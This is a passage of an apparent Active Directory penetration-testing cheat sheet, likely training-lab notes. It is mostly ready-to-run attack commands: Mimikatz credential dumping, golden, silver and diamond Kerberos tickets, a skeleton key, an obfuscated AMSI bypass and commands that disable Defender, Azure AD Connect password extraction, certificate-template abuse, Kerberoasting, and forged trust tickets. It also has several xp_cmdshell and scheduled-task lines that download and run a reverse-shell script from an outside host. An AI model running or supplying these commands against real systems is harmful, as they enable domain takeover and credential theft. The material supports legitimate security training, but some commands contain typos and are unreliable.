Invoke-SelfSearch -Mailbox pwnadmin@techcorp.local -ExchHostname us-exchange -OutputCsv .\mail.csv
```

>   Alternatively, using exchange manager (Organization Management) or exchange user (Exchange Trusted Subsystem) privileges also allows us to read the emails!

### Resource Based Constrained Delegation

##### Methodology/Steps using PowerShell

>   1.  Enumerate the users and identify if you have write perms on any object
>   2.  Create a list of all the systems where you have write perms
>   3.  Store that in $comps variable
>   4.  Set RBCD on all of these systems
>   5.  Now we can dump the AES keys for the student system ( Remember: Copy the AES key for the system account and not the Virtual Account, you can identify it by the SID. The SID of the system account will be shorter)
>   6.  Using Rubeus we can generate a HTTP s4u and get a connection using winrs. If you want to extract more secrets from that system you need to generate a CIFS s4u to transfer files on the system.

###### 1. Enumerate if we have Write permissions over any object

```powershell
# PowerView
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
```

###### 2. Configure RBCD on us-helpdesk for student machines

```powershell
# AD Module
$comps = 'student1$','student2$'
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps
```

###### 3. We we can dump the AES Keys of the Students

```powershell
# Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# SafetyKatz Binary
SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
```

###### 4. Rubeus

>   Use the AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want

```powershell
Rubeus.exe s4u /user:student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
```

###### 5. Winrs

>   Now we can connect to the session

```powershell
winrs -r:us-helpdesk cmd.exe
```

# VII. Domain Persistence

### Golden Ticket 

##### Methodology/Steps

> 1. Get a Powershell session as a **"domain admin"** using **"Over pass the hash"** attack
>
> 2. Create a **New-PSSession** attaching to the **"domain controller"**
>
> 3. Enter the new session using **Enter-PSSession** 
>
> 4. Bypass the *AMSI* 
>
> 5. Exit
>
> 6. Load **Mimikatz.ps1** on the new session using **Invoke-command**
>
> 7. Enter the new session using **Enter-PSSession** *again*
>
> 8. Now we can execute mimikatz on the DC
>
> 9. Keep note of **krbtgt** hash
>
> 10. Now go to any **"non domain admin"** account
>
> 11. Load **Mimikats.ps1** 
>
> 12. Now we can create a ticket using the DC **krbtgt** hash 
>
> 13. Now we can access any service on the DC; Example **`ls \\dc-corp\C$`** or 
>
>     ```powershell
>     PsExec64.exe \\prodsrv.garrison.castle.local -u GARRISON\prodadmin -p Password1! cmd
>     ```

---

##### Invoke-Mimikatz

###### Disable Defender [ Important ]

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

###### AMSI bypass [ Important ]

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{O}"-F'F', 'rE' ) ) 3; ( GeT-VariaBle ( "1Q2U" + "zX" )  -VaL_s+)."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{@}{5}" -f'Util', 'A', 'Amsi','.Management.', 'utomation.','s', 'System' ))."g`etf`iE1D"( ( "{O}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{O}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

###### Execute mimikatz on DC as DA to get krbtgt hash

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

###### Create a ticket on any machine [ "pass the ticket" attack]

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5bO0dc865eadcea941le4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

###### List Kerberos services available

```powershell
klist
```

###### To use the DCSync feature for getting krbtg hash execute the below command with DA privileges

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

```ad-note
Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC
```

---

##### Binaries

###### Using SafetyKatz

```powershell
C:\Users\Public\SafetyKatz.exe "lsadump::lsa /patch" "exit" 
or
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

###### On a machine which can reach the DC over network (Need elevation):

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

### Silver Ticket

##### Invoke-Mimikatz

###### Execute mimikatz on DC as DA to get krbtgt hash

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

###### Using hash of the Domain Controller computer account, below command provides access to shares on the DC

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62FF22 /user:Administrator /ptt"'
```

```ad-note
Similar command can be used for any other service on a machine.
Which services? HOST, RPCSS, WSMAN and many more.
```

###### Schedule and execute a task

```powershell
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.psi''')'"

schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
```

### Skeleton Key

##### Invoke-Mimikatz

###### Use the below command to inject a skeleton-Key

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

```ad-note
Skeleton Key password is : **mimikatz**
```

###### Now we can access any machine with valid username and password as mimikatz

```powershell
Enter-PSSession -Computername dcorp-dc.dollarcorp.moneycorp.local -credential dcorp\Administrator
```

###### LSASS running as a protected process

In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC

```mimikatz
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

### Diamond Ticket

##### Rubeus.exe

###### We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too)

```powershell
Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /user:studentuserx /password:studentuserxpassword /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

###### We could also use /tgtdeleg option in place of credentials in case we have access as a domain user

```powershell
Rubeus.exe diamond /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

# VIII. Cross Domain Attacks [ Azure AD Integration ]

##### Methodology/Steps

> 1. Enumerate the users accounts who have **MSOL_** attribute identity.
> 2. Start a process with the priv of that user
> 3. Execute adconnect ps1 script, this will provide the creds of the user
> 4. Connect using runas and perform a DCSync Attack

---

##### PowerShell

###### 1. Enumerate the PHS account and server where AD Connect is installed

```powershell
# Powerview
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local

# AD Module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

###### 2. Dump the creds of the user and logon

> With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text
> Note: Adconnect.ps1 script's code runs powershell.exe so verbose logs (like transcripts) will be there.

```powershell
# Adconnect
. .\adconnect.ps1
adconnect

# Runas that user
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

###### 3. Execute the DCSync attack

> Please note that because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the **MSOL_** account will be excluded from tools like MDI! This will allow us to run DCSync without any alerts!

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
```

---

###### Abusing Azure AD Connect

+ Run the following script

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

#$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

### AD CS

-   Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
    -   Used by organization for smart cards, SSL certificates, code signing, etc.
-   Clients send certificate signing requests (CSRs) to an (enterprise) CA, which signs issued certificates using the private key for the CA certificate
-   AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
-   "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."

##### NTAuthCertificates

-   An enterprise certificate authority generates a self signed certificate that is then included into the *NTAuthCertificates* Object into the Domain.
-   These are certificates that enable authentication for Active Directory
-   The **root** CA is the *DC-CA*
-   The **subordinate** CA is the *CA-CA*
-   Both of these, the private key associated with the certificates can be used to sign certificates that then can be used to allow authentication for Active Directory.

##### Certificate Enrollment

1.  The client needs to generate a public/private key pair.
2.  Then the client needs to generate a CSR, also known as Certificate Signing Request. Its basically a message which contains information about the certificate they want to request. i.e. Like what its used for, example code signing, TLS. Contains info like the subject of the certificate or who ever is requesting the certificate. It also has a field which contains the template. In this step the CSR is sent to the Enterprise CA. The CA takes a look at the template, the template is basically a blueprint of settings that the certificate is going to have once its issued.
3.  Assuming everything is correct and conforming if the user is allowed to obtain a certificate for what they are requesting. The CA will then sign a certificate using its private key and return it back to the client.

##### Using Rubeus to request for a certificate

-   Rubeus and Kekeo support Kerberos authentication using certificates via PKINIT
    -   Schannel authentication also supports certificates (e.g., LDAPS)

```powershell
# Rubeus
Rubeus.exe asktgt /user:admin /certificate:C:\Temp\cert.pfx /password:password
```

##### **"Passive"** Certificate Theft

-   If hardware protection is not used, existing user/machine certificates are stored using DPAPI
    -   *Mimikatz* and *SharpDPAPI* can steal such certs/private keys

##### **"Active"** Certificate Theft

-   Users/machines can enroll in any template they have Enroll permissions for
    -   By default the User and Machine templates are available
-   We want a template that allows for AD authentication
    -   Lets us get a user’s TGT (and NTLM!)
    -   Lets us compromise a computer through RBCD/S4U2Self
-   We can enroll through DCOM (Certify), RPC, and AD CS web endpoints

```powershell
# Certify
Certify.exe request /ca:da.theshrine.local\theshrine-DC-CA /template:user
```

##### Offensive Advantages

1.  Doesn’t touch `lsass.exe`’s memory!
2.  Doesn’t need elevation (for user contexts)!
3.  Few existing detection methods! (*currently* lesser known technique : )
4.  Separate credential material from passwords
    1.  Works even if an account changes its password!
    2.  Long lifetime. By default, User/Machine templates issue certificates valid for 1 year.

### AD CS Abuse

-   There are various ways of abusing ADCS!
    -   Extract user and machine certificates
    -   Use certificates to retrieve NTLM hash
    -   User and machine level persistence
    -   Escalation to Domain Admin and Enterprise Admin
    -   Domain persistence



##### Methodology

>   1.  Find vulnerable cert templates, keep note of the Template name
>   2.  Request a template with the template name and using altname specify the user you want to attack
>   3.  Using openssl generate the pfx from the private key and sign it with a password
>   4.  Using Rubeus request a tgt with the admin pfx and inject it into the session
>   5.  Now we will be able to access the shares of the administrator

##### Binaries

###### 1. Search for vulnerable certificate templates

```powershell
# Certify
# Enumerate the templates
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject

# Enumerate vulnerable templates
Certify.exe find /vulnerable

# Enumerate vulnerable templates using ca
Certify.exe find /vulnerable /ca:dc.theshire.local\theshire-DC-CA
```

###### 2. Enroll in the template

```powershell
# Certify
Certify.exe request /cs:dc.theshire.local\theshire-DC-CA /template:ESC1Template /altname:Administrator

# CRTE Lab
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

###### 3. Change the RSA into a PFX

>   Paste the Private key in a file named : *cert.pem*

```powershell
# linux
# openssl and provide a password
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```powershell
# windows
# openssl and provide a password
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem - keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
```

###### 4. Request a TGT with the pfx

```powershell
# Rubeus
# Request DA TGT and inject it
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt

# Request EA TGT and inject it
Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```

### Shadow Credentials

Users and Computer shave `msDS-KeyCredentialLink` attribute that contains the raw public keys of certificate that can be used as an alternative credential.

##### Pre-requisites to abuse Shadow Credentials

-   AD CS (or Key Trust)
-   Support for PKINIT and at least one DC with Windows Server 2016 or above
-   Permissions (`GenericWrite`/`GenericAll`) to modify the `msDS-KeyCredentialLink` attribute of the target object.

##### Abusing User Object

###### 1. Enumerate the permissions

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

###### 2. Add the Shadow Credential

```powershell
Whisker.exe add /target:supportXuser
```

###### 3. Using PowerView, see if the Shadow Credential is added.

```powershell
Get-DomainUser -Identity supportXuser
```

###### 4. Request the TGT by leveraging the certificate

```powershell
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
```

###### 5. Inject the TGT in the current session or use the NTLM hash

```powershell
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

##### Abusing Computer Object

###### 1. Enumerate the permissions

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "mgmtadmin"}
```

###### 2. Add the Shadow Credentials

```powershell
SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:328... /run:cmd.exe" "exit"
Whisker.exe add /target:us-helpdesk$
```

###### 3. Using PowerView, see if the Shadow Credential is added

```powershell
Get-DomainComputer -Identity us-helpdesk
```

###### 4. Request the TGT by leveraging the certificate

```powershell
Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0A... /password:"ViGFo..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show
```

###### 5. Request and Inject the TGS by impersonating the user

```powershell
Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGk... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
```

# IX. Cross Forest Attacks

### Kerberoast

##### Methodology/Steps

>   1.  First find all the SPN accounts
>   2.  Request a TGS for the user who has forest trust
>   3.  Crack the ticket using JTR
>   4.  Using PowerShell request a TGS across trust

##### PowerShell

###### 1. Find user accounts used as Service account

>   It is possible to execute Kerberoast across Forest trusts

```powershell
# Powerview
Get-NetUser -SPN
Get-NetUser -SPN -Verbose | select displayname,memberof
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}

# AD Module
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName -Server $_.Name}
```

###### 2. Request a TGS

```powershell
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```

###### 3. Check for the TGS

```powershell
klist
```

###### 4. Crack the ticket using JTR

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

##### PowerShell

###### 5. Request TGS across trust

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```

### Forest Root Trust Key

##### Methodology/Steps

>   1.  Dump the trust keys of the inter-forest trusts
>   2.  Note the SID of the current Domain, SID of the target Domain and the rc4_hmac_nt(Trust Key) of the target Domain. (example : *ecorp$*)
>   3.  We can forge a inter-forest TGT with the proper *target* and *rc4* parameters
>   4.  Now request a TGS using **asktgs.exe**
>   5.  Now Inject the TGS in the memory
>   6.  Now we can access all the shared files admin DC

------

##### Invoke-Mimikatz

###### 1. We require the trust key of inter-forest trust

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

###### 2. Forge the inter-forest TGT

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787- 2521448726-163245708 /sids:S-1-5-21-2781415573- 3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'
```

###### 3. Request a TGS

>   Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket with Kekeo

```powershell
# keko
tgs::ask /tgt:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local
# Or using older version of Kekeo
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/techcorp-dc.techcorp.local
```

###### 4. Inject and use the TGS

>   Use the TGS to access the targeted service (may need to use it twice)

```powershell
misc::convert lsa TGS_Administrator@us.techcorp.local_krbtgt~TECHCORP.LOCAL@US.TECHCORP.LOCAL.kirbi 
# Or
.\kirbikator.exe lsa .\CIFS.techcorp-dc.techcorp.local.kirbi
ls \\techcorp-dc.techcorp.local\c$
```

##### Rubeus

###### 1. Create ticket and add it into the memory using asktgs

```powershell
# Rubeus
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt

C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# can access the shares now
ls \\techcorp-dc.techcorp.local\c$
ls \\euvendor-dc.euvendor.local\c$
```

##### PowerShell

###### 1. Access the euvendor-net machine using PSRemoting

```powershell
# cmdlet
Invoke-Command -ScriptBlock{whoami} -ComputerName euvendor\net.euvendor.local -Authentication NegotiateWithImplicitCredential
```

### Extras

##### To use the DCSync feature for getting krbtg hash execute the below command with DC privileges

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:garrison.castle.local /all /cvs"'
```

##### Get the `ForeignSecurityPrincipal`

```powershell
#These SIDs can access to the target domain
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

#With the by default SIDs, we find S-1-5-21-493355955-4215530352-779396340-1104
#We search it in our current domain
Get-DomainObject |? {$_.objectsid -match "S-1-5-21-493355955-4215530352-779396340-1104"}
```

### PAM Trust

###### 1. Enumerating trusts and hunting for access

>   We have DA access to the **techcorp.local** forest. By enumerating trusts and hunting for access, we can enumerate that we have Administrative access to the **bastion.local** forest.

```powershell
# PowerView
# From techcorp-dc
Get-ADTrust -Filter * 
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

###### 2. Enumerate if there is a PAM trust

```powershell
# PowerView
$bastiondc = New-PSSession bastion-dc.bastion.local 
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined - eq $False)}} -Session $bastiondc
```

###### 3. Check which users are members of the Shadow Principals

```powershell
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
```

###### 4. Establish a direct PSRemoting session on bastion-dc and access production.local

```powershell
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

# X. Trust Abuse

### MSSQL Abuse - Forest Trusts

```powershell
# https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.psd1
Import-Module .\PowerUpSQL.psd1
```

##### Methodology/Steps

>   1.  Check the SPN's
>   2.  Check which SPN's you have access to
>   3.  Check the Privileges you have of the above filtered SPN's
>   4.  Keep note of the **Instance-Name**, **ServicePrincipalName** and the **DomainAccount-Name**
>   5.  If you find any service with *higher privileges* continue below to abuse it

------

##### PowerUpSQL [ Basic Enumeration ]

###### 1. Enumerate SPN

```powershell
Get-SQLInstanceDomain
```

###### 2. Check Access

```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

###### 3. Check Privileges / Gather Infromation

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### MSSQL Abuse - MSSQL Database Links

-   A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
-   In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
-   Database links work even across forest trusts.

##### Execute commands on target server

-   On the target server, either `xp_cmdshell` should be already enabled; or
-   If **rpcout** is enabled (disabled by default), `xp_cmdshell` can be enabled using:

```mssql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
```

-   If **rpcout** is disabled but we are **sa**, it can be enabled with

```mssql
EXEC sp_serveroption 'LinkedServer', 'rpc out', 'true';
```

#### Methodology/Steps

>   1.  Check the SQL Server link
>   2.  Keep note if you have link to any other database in **DatabaseLinkName**
>   3.  If SysAdmin:0 means that we will not be allowed to enable **xp_cmdshell**
>   4.  Keep on enumerating and check all the linked databases you have access to
>   5.  Now we can try to execute commands through out all the linked databases found

------

##### PowerUpSQL [ Abusing the privileges ]

###### 1. Enumerate SQL Server links

```powershell
Get-SQLServerLink -Instance <instanceName> -Verbose
select * from master..sysservers
```

###### 2. Enumerate DB links

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Verbose
select * from openquery("<instanceName>",'select * from openquery("<linkedInstance>",''select * from master..sysservers'')')
```

###### 3. Execute commands on target server

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query "exec master..xp_cmdshell 'whoami'" | ft
```

###### Download file on target server

```powershell
Get-SQLServerLinkCrawl -Instance <instanceName> -Query 'exec master..xp_cmdshell "powershell -c iex (new-object net.webclient).downloadstring(''http://IP:8080/Invoke-HelloWorld.ps1'',''C:\Windows\Temp\Invoke-HelloWorld.ps1'')"'

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.21/Invoke-PowerShellTcp.ps1'')"'
```

## Extra Commands

##### Basic SQL Server queries for DB enumeration

Also works with **Get-SQLServerLinkCrawl**

```powershell
# View all db in an instance
Get-SQLQuery -Instance <instanceName> -Query "SELECT name FROM sys.databases"

# View all tables
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.TABLES" 

# View all cols in all tables in a db
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.columns"

# View data in table
Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName"

# Enumerate linked servers
select * from master..sysservers

# Openquery function can be used to run queries on a linked database
select * from openquery("192.168.23.25",'select * from master..sysservers')

# Openquery queries can be chained to access links within links (nested links)
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')

# From the initial SQL server, OS commands can be executed using nested link queries
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')

# How to enable rpcout in a linked DB
# First get a rev shell on the parent DB
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT ""db-sqlsrv"""

# Query command to a linked DB
Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName" -QueryTarget db-sqlsrv
```



